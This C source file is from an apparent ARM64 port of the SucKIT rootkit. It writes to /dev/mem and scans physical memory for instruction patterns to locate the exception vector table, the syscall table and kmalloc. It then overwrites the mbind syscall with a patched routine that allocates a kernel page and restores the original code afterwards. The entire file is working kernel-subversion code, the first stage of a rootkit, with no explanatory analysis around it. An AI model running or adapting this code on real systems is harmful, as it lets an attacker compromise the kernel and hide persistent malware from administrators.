 
/*
 * This file is part of SucKIT-on-ARM64 (https://github.com/lipidex/SucKIT-on-ARM64).
 * Copyright (c) 2020 Pierpaolo Agamennone.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
#include <numaif.h>

#include <sys/time.h>
#include <sys/resource.h>

#define MAP_SIZE 4096UL // Page size
#define MAP_MASK (MAP_SIZE - 1) // Mask to filter the address of the page

#define GFP_KERNEL 0xcc0 // Value of the flag GFP_KERNEL at the Linux kernel version 5.4

#define TMP_SIZE (4*1024)
#define NUM_SYS_CALL 0xEB // number of mbind syscall used to run our routine
// #define SYSCALL_HOOK 0x8D // number of mbind syscall hooked


unsigned long virt_offset;

unsigned int read_instruction(int mem, unsigned long phys_addr);
unsigned long read_virt_addr(int mem, unsigned long phys_addr);
unsigned long write_virt_addr(int mem, unsigned long phys_addr, unsigned long data_virt_addr);
int read_buf(int mem, unsigned long phys_addr, unsigned char* buff, int size);
int write_buf(int mem, unsigned long phys_addr, unsigned char* buf, int size);
unsigned long find_evt_base_addr(int mem);
unsigned long find_handler_svc_addr(int mem, unsigned long evt_base_addr);
unsigned long find_sct_phys_base_addr(int mem, unsigned long handler_svc_addr);
unsigned long find_evt_virt_addr(int mem, unsigned long handler_svc_addr);
void calc_virt_offset(unsigned long virt_addr, unsigned long phys_addr);
unsigned long phys_to_virt(unsigned long phys_addr);
unsigned long virt_to_phys(unsigned long virt_addr);
unsigned long find_kmalloc_phys_addr(int mem);
unsigned long get_kpage_virt_addr(int mem, unsigned long sct_phys_base_addr, unsigned long kmalloc_virt_addr);
void patch_routine(unsigned char* buff, unsigned long kmalloc_virt_addr, int size, int flag);
long sys_call_kmalloc();
void sys_call_kmalloc_end();

int main ()
{
	unsigned long evt_base_addr, handler_svc_addr, evt_virt_addr;
	unsigned long sct_phys_base_addr, kmalloc_phys_addr, size_sys_call_kmalloc;
	unsigned long kpage_virt_addr, sct_virt_base_addr;

	int mem;
	int ret_sys;

	// Open the character device mem
	mem = open("/dev/mem", O_RDWR|O_SYNC);
	if(mem<0){
		printf("Error during the open of /dev/mem\n");
		return 1;
	}

	evt_base_addr = find_evt_base_addr(mem);
	printf("Base address of the EVT: 0x%lx\n", evt_base_addr);

	handler_svc_addr = find_handler_svc_addr(mem, evt_base_addr);
	printf("Address of the handler SVC: 0x%lx\n", handler_svc_addr);

	evt_virt_addr = find_evt_virt_addr(mem, handler_svc_addr);
    printf("Address where is stored a copy of the virtual address of the EVT: 0x%lx\n", evt_virt_addr);

	sct_phys_base_addr = find_sct_phys_base_addr(mem, handler_svc_addr);
	printf("Base physical address of the SCT: 0x%lx\n", sct_phys_base_addr);

	calc_virt_offset(read_virt_addr(mem, evt_virt_addr), evt_base_addr);
	printf("Virtual Offset: %lx\n", virt_offset);

	sct_virt_base_addr = phys_to_virt(sct_phys_base_addr);
	printf("Base virtual address of the SCT: 0x%lx\n", sct_virt_base_addr);

	kmalloc_phys_addr = find_kmalloc_phys_addr(mem);
	printf("Physical address of kmalloc: 0x%lx\n", kmalloc_phys_addr);

	kpage_virt_addr = get_kpage_virt_addr(mem, sct_phys_base_addr, kmalloc_phys_addr);
	printf("Virtual address of the allocated kernel page: 0x%lx\n", kpage_virt_addr);

	close(mem);
	
	return 0;
}

unsigned int read_instruction(int mem, unsigned long phys_addr)
{
	void *map_base, *virt_addr;
	unsigned int return_value;

	// Map the page of instruction
	map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, mem, phys_addr & ~MAP_MASK);
	if(map_base == (void *) -1)
	{
		printf("Error during the mapping of the page!");
		return 2;
	}

	// Read instruction
	virt_addr = map_base + (phys_addr & MAP_MASK);
	return_value = *((unsigned int *) virt_addr);

	// Delete the mapping of the page
	if(munmap(map_base, MAP_SIZE) == -1)
	{
		printf("Error during the delete the mapping of the page!\n");
	}

	return return_value;
}

unsigned long read_virt_addr(int mem, unsigned long phys_addr)
{
	void *map_base, *virt_addr;
	unsigned long return_value;

	// Map the page
	map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, mem, phys_addr & ~MAP_MASK);
	if(map_base == (void *) -1)
	{
		printf("Error during the mapping of the page!");
		return 2;
	}

	// Read instruction
	virt_addr = map_base + (phys_addr & MAP_MASK);
	return_value = *((unsigned long *) virt_addr);

	// Delete the mapping of the page
	if(munmap(map_base, MAP_SIZE) == -1)
	{
		printf("Error during the delete the mapping of the page!\n");
	}

	return return_value;
}

unsigned long write_virt_addr(int mem, unsigned long phys_addr, unsigned long data_virt_addr)
{
	void *map_base, *virt_addr;

	// Map the page
	map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, mem, phys_addr & ~MAP_MASK);
	if(map_base == (void *) -1)
	{
		printf("Error during the mapping of the page!");
		return 2;
	}

	// Read instruction
	virt_addr = map_base + (phys_addr & MAP_MASK);
	*((unsigned long *) virt_addr) = data_virt_addr;

	// Delete the mapping of the page
	if(munmap(map_base, MAP_SIZE) == -1)
	{
		printf("Error during the delete the mapping of the page!\n");
	}

	return 0;
}

int read_buf(int mem, unsigned long phys_addr, unsigned char* buf, int size)
{
	unsigned char *map_base, *p;
	unsigned long i, ind = phys_addr;

	for(i=phys_addr & ~MAP_MASK; i<phys_addr+size; i+=MAP_SIZE)
	{
		// Map the page
		map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, mem, i);

		if(map_base == (void *) -1)
		{
			printf("Error during the mapping of the page!");
			return 0;
		}

		for(p = (map_base + (ind & MAP_MASK)); p < (map_base + MAP_SIZE) && ind < phys_addr + size; ind++, p++)
		{
			buf[ind - phys_addr] = *p;
		}

		// Delete the mapping of the page
		if(munmap(map_base, MAP_SIZE) == -1)
		{
			printf("Error during the delete the mapping of the page!\n");
			return 0;
		}
	}
}

int write_buf(int mem, unsigned long phys_addr, unsigned char* buf, int size)
{
	unsigned char *map_base, *p;
	unsigned long i, ind = phys_addr;

	for(i=phys_addr & ~MAP_MASK; i<phys_addr+size; i+=MAP_SIZE)
	{
		// Map the page
		map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, mem, i);

		if(map_base == (void *) -1)
		{
			printf("Error during the mapping of the page!");
			return 0;
		}

		for(p = (map_base + (ind & MAP_MASK)); p < (map_base + MAP_SIZE) && ind < phys_addr + size; ind++, p++)
		{
			*p = buf[ind - phys_addr];
		}

		// Delete the mapping of the page
		if(munmap(map_base, MAP_SIZE) == -1)
		{
			printf("Error during the delete the mapping of the page!\n");
			return 0;
		}
	}
}

unsigned long find_evt_base_addr(int mem)
{
	unsigned char *map_base, *p;
	unsigned long i = 0x0;
	unsigned long inst_1 = 0, inst_2 = 0, inst_3 = 0;

	for(i=0x0; ;i+=MAP_SIZE)
	{
		// Map the page
		map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, mem, i);

		if(map_base == (void *) -1)
		{
			printf("Error during the mapping of the page!");
			return 2;
		}

		for(p = (map_base + (i & MAP_MASK)); p < (map_base + MAP_SIZE); )
		{
			// Find the third instruction of the research pattern
			if((*p == 0xe0 && *(p+1) == 0x63 && *(p+2) == 0x20 && *(p+3) == 0xcb) && (inst_1 != 0 && inst_2 != 0 && inst_3 == 0))
			{
				inst_3 = (unsigned long) (p - map_base + i);
				printf("pattern_evt_istr_3: 0x%lx, val: 0x%x\n", inst_3, *((unsigned int *) p));

				p+=4;
				continue;
			}

			// Find the second instruction of the research pattern
			if((*p == 0xe0 && *(p+1) == 0x63 && *(p+2) == 0x20 && *(p+3) == 0xcb) && (inst_1 != 0 && inst_2 == 0 && inst_3 == 0))
			{
				inst_2 = (unsigned long) (p - map_base + i);
				printf("pattern_evt_istr_2: 0x%lx, val: 0x%x\n", inst_2, *((unsigned int *) p));

				p+=4;
				continue;
			}

			// If I have found all the pattern instructions I will stop
			if(inst_1 != 0 && inst_2 != 0 && inst_3 != 0)
				break;

			// Find the first instruction of the research pattern
			if((*p == 0xff && *(p+1) == 0x63 && *(p+2) == 0x20 && *(p+3) == 0x8b) && (inst_1 == 0 && inst_2 == 0 && inst_3 == 0))
			{
				inst_1 = (unsigned long) (p - map_base + i);
				printf("pattern_evt_istr_1: 0x%lx, val: 0x%x\n", inst_1, *((unsigned int *) p));

				p+=4;
				continue;
			}

			// If I don't find all the instructions I reset
			if((inst_1 != 0 && inst_2 == 0 && ((p - map_base + i) - inst_1) > 0x4 ) || (inst_2 != 0 && ((p - map_base + i) - inst_2) > 0x8))
			{
				inst_1 = inst_2 = inst_3 = 0;
			}
			p+=4;
		}

		// Delete the mapping of the page
		if(munmap(map_base, MAP_SIZE) == -1)
		{
			printf("Error during the delete the mapping of the page!\n");
		}

		// If I have found all the pattern instructions I will stop
		if(inst_1 != 0 && inst_2 != 0 && inst_3 != 0)
			break;
	}

	// Return the address of the first instruction of the pattern less the offset that have of the start of the table
	return inst_1 - 0x4;
}

unsigned long find_handler_svc_addr(int mem, unsigned long evt_base_addr)
{
	unsigned long vector = evt_base_addr + 0x400; // Address of the vector used from the interrupt software of SVC
	unsigned long vector_branch = vector + 0x20; // Address of the branch instruction containing the offset to arrive at the label el0_sync
	unsigned int vector_branch_instruction = read_instruction(mem, vector_branch); // First instruction branch of the vector
	unsigned long el0_sync = vector_branch + ((vector_branch_instruction<<6)>>6)*4; // Address of label el0_sync
	unsigned long el0_sync_impl = el0_sync + 0x15C; // Address of the label el0_sync without the macro kernel_entry
	unsigned long el0_sync_impl_branch = el0_sync_impl + 0x4*3; // Address of the branch instruction containing the offset of the label el0_svc
	unsigned int el0_sync_impl_branch_instruction = read_instruction(mem, el0_sync_impl_branch); // First branch instruction of the label el0_sync
	unsigned long el0_svc = el0_sync_impl_branch + ((el0_sync_impl_branch_instruction<<8)>>13)*4; // Address of the label el0_svc
	unsigned long el0_svc_branch = el0_svc + 0x4*3; // Address of the first branch instruction of the label el0_svc
	unsigned int el0_svc_branch_instruction = read_instruction(mem, el0_svc_branch); // Address of the first branch instruction of the label el0_svc
	unsigned long el0_svc_handler = el0_svc_branch + ((el0_svc_branch_instruction<<6)>>6)*4; // Address of the label el0_svc_handler

	return el0_svc_handler;
}

unsigned long find_evt_virt_addr(int mem, unsigned long el0_svc_handler)
{
	unsigned long el0_svc_handler_adrp = el0_svc_handler + 0x4*10; // Address of the adrp instruction of the label el0_svc_handler
	unsigned int el0_svc_handler_adrp_instruction = read_instruction(mem, el0_svc_handler_adrp); // Instruction adrp of the label el0_svc_handler
	unsigned long el0_svc_handler_base_addr = (((el0_svc_handler_adrp_instruction<<1)>>30)<<12) + ((el0_svc_handler_adrp_instruction>>5)<<14) + ((el0_svc_handler_adrp>>12)<<12);// Base address obtained from the adrp instruction

	return el0_svc_handler_base_addr;
}

unsigned long find_sct_phys_base_addr(int mem, unsigned long el0_svc_handler)
{
	unsigned long el0_svc_handler_base_addr = find_evt_virt_addr(mem, el0_svc_handler); // Base address without offset of the SCT
	unsigned long el0_svc_handler_add = el0_svc_handler + 0x4*11; // Address of the add instruction of the label el0_svc_handler
	unsigned int el0_svc_handler_add_instruction = read_instruction(mem, el0_svc_handler_add); // Add instruction of the label el0_svc_handler
	unsigned long el0_svc_handler_offset = (el0_svc_handler_add_instruction<<10)>>20; // Offset to add to the base address

	return el0_svc_handler_base_addr + el0_svc_handler_offset;
}


void calc_virt_offset(unsigned long virt_addr, unsigned long phys_addr)
{
	virt_offset = virt_addr - phys_addr; // Calculate virtual offset
}

unsigned long phys_to_virt(unsigned long phys_addr)
{
	return phys_addr + virt_offset;
}


unsigned long virt_to_phys(unsigned long virt_addr)
{
	return virt_addr - virt_offset;
}


unsigned long find_kmalloc_phys_addr(int mem)
{
	unsigned char *map_base, *p;
	unsigned long i = 0x0;
	unsigned long inst_1 = 0, inst_2 = 0, inst_3 = 0;

	for(i=0x0; ;i+=MAP_SIZE)
	{
		// Map the page
		map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, mem, i);

		if(map_base == (void *) -1)
		{
			printf("Error during the mapping of the page!");
			return 2;
		}

		for(p = (map_base + (i & MAP_MASK)); p < (map_base + MAP_SIZE); )
		{
			// Find the third instruction of the research pattern
			if((*p == 0xf5 && *(p+1) == 0x03 && *(p+2) == 0x01 && *(p+3) == 0x2a) && (inst_1 != 0 && inst_2 != 0 && inst_3 == 0))
			{
				inst_3 = (unsigned long) (p - map_base + i);
				printf("pattern_kmalloc_istr_3: 0x%lx, val: 0x%x\n", inst_3, *((unsigned int *) p));

				p+=4;
				continue;
			}

			// Find the second instruction of the research pattern
			if((*p == 0xf7 && *(p+1) == 0x03 && *(p+2) == 0x1e && *(p+3) == 0xaa) && (inst_1 != 0 && inst_2 == 0 && inst_3 == 0))
			{
				inst_2 = (unsigned long) (p - map_base + i);
				printf("pattern_kmalloc_istr_2: 0x%lx, val: 0x%x\n", inst_2, *((unsigned int *) p));

				p+=4;
				continue;
			}

			// If I have found all the pattern instructions I will stop
			if(inst_1 != 0 && inst_2 != 0 && inst_3 != 0)
				break;

			// Find the first instruction of the research pattern
			if((*p == 0xf6 && *(p+1) == 0x03 && *(p+2) == 0x00 && *(p+3) == 0xaa) && (inst_1 == 0 && inst_2 == 0 && inst_3 == 0))
			{
				inst_1 = (unsigned long) (p - map_base + i);
				printf("pattern_kmalloc_istr_1: 0x%lx, val: 0x%x\n", inst_1, *((unsigned int *) p));

				p+=4;
				continue;
			}

			// If I don't find all the instructions I reset
			if((inst_1 != 0 && inst_2 == 0 && ((p - map_base + i) - inst_1) > 0x4 ) || (inst_2 != 0 && ((p - map_base + i) - inst_2) > 0x4))
			{
				inst_1 = inst_2 = inst_3 = 0;
			}
			p+=4;
		}

		// Delete the mapping of the page
		if(munmap(map_base, MAP_SIZE) == -1)
		{
			printf("Error during the delete the mapping of the page!\n");
		}

		// If I have found all the pattern instructions I will stop
		if(inst_1 != 0 && inst_2 != 0 && inst_3 != 0)
			break;
	}

	// Return the address of the first instruction of the pattern less the offset that have from the start of kmalloc
	return inst_1 - 0x4*5;
}

unsigned long get_kpage_virt_addr(int mem, unsigned long sct_phys_base_addr, unsigned long kmalloc_phys_addr)
{
	unsigned long kmalloc_virt_addr, size_sys_call_kmalloc;
	unsigned long sys_vittima_virt_addr, sys_vittima_phys_addr;
	unsigned long kpage_virt_addr;

	unsigned char buff[TMP_SIZE];
	unsigned char tmp[TMP_SIZE];

	// Calculate virtual address of kmalloc
	kmalloc_virt_addr = phys_to_virt(kmalloc_phys_addr);
	printf("Virtual address of kamlloc: 0x%lx\n", kmalloc_virt_addr);

	// Calculate routine size
	size_sys_call_kmalloc = ((long (*)()) sys_call_kmalloc_end - sys_call_kmalloc);
	printf("Size of sys_call_kmalloc: %lu\n", size_sys_call_kmalloc);
	if(size_sys_call_kmalloc > TMP_SIZE) {
		printf("sys_call_kmallok is too big!\n");
		return 1;
	}

	// Read virtual address of the victim System Call
	sys_vittima_virt_addr = read_virt_addr(mem, sct_phys_base_addr + NUM_SYS_CALL*0x8);
	printf("Virtual address of victim syscall: 0x%lx\n", sys_vittima_virt_addr);

	// Calculate physical address of the victim System Call
	sys_vittima_phys_addr = virt_to_phys(sys_vittima_virt_addr);
	printf("Physical address of the victim System Call: 0x%lx\n", sys_vittima_phys_addr);

	// Copy routine on buff
	memcpy(buff, sys_call_kmalloc, size_sys_call_kmalloc);

	// Patch for kmalloc in the routine
	patch_routine(buff, kmalloc_virt_addr, 100, GFP_KERNEL);

	// Copy original syscall
	printf("Saving the original syscall!\n");
	read_buf(mem, sys_vittima_phys_addr, tmp, size_sys_call_kmalloc);
	printf("Saved successfully!\n");

	// Overwrite Syscall with routine
	printf("Start overwriting syscall with sys_call_kmalloc!\n");
	write_buf(mem, sys_vittima_phys_addr, buff, size_sys_call_kmalloc);
	printf("Syscall overwritten!\n");

	// Call overwritten Syscall
	printf("Call syscall!\n");
	kpage_virt_addr = mbind(NULL, 0, 0, 0, 0, 0);
	//sleep(10);
	printf("Syscall called!\n");

	// Restore original Syscall
	printf("Start restore syscall!\n");
	write_buf(mem, sys_vittima_phys_addr, tmp, size_sys_call_kmalloc);
	printf("Syscall restored!\n");

	// Return the address given by Syscall
	return kpage_virt_addr;
}

void patch_routine(unsigned char* buff, unsigned long kmalloc_virt_addr, int size, int flag)
{
	unsigned int byte_1_2, byte_3_4, byte_5_6, byte_7_8;

	unsigned int * buff_instr = (unsigned int *) buff;

	byte_1_2 = (kmalloc_virt_addr<<48)>>48;
	byte_3_4 = (kmalloc_virt_addr<<32)>>48;
	byte_5_6 = (kmalloc_virt_addr<<16)>>48;
	byte_7_8 = (kmalloc_virt_addr)>>48;

	// Patch address of kmalloc
	buff_instr[2] = (((buff_instr[2]>>21)<<21) | (byte_1_2<<5)) | ((buff_instr[2])<<27)>>27;
	buff_instr[3] = (((buff_instr[3]>>21)<<21) | (byte_3_4<<5)) | ((buff_instr[3])<<27)>>27;
	buff_instr[4] = (((buff_instr[4]>>21)<<21) | (byte_5_6<<5)) | ((buff_instr[4])<<27)>>27;
	buff_instr[5] = (((buff_instr[5]>>21)<<21) | (byte_7_8<<5)) | ((buff_instr[5])<<27)>>27;

	// Patch flag
	buff_instr[8] = (buff_instr[8] | (flag<<5));

	// Patch size
	buff_instr[9] = (buff_instr[9] | (size<<5));
}

long sys_call_kmalloc()
{
	// Random virtual address used to the patch
	void*  (*__kmalloc)(size_t, unsigned int) = (void * (*)(size_t, unsigned int)) 0xFFEEDDCCBBAA9988;

	return (unsigned long)(unsigned long *) (*__kmalloc)(0, 0);
}
void sys_call_kmalloc_end(){}  // Used to get the dimension of the function
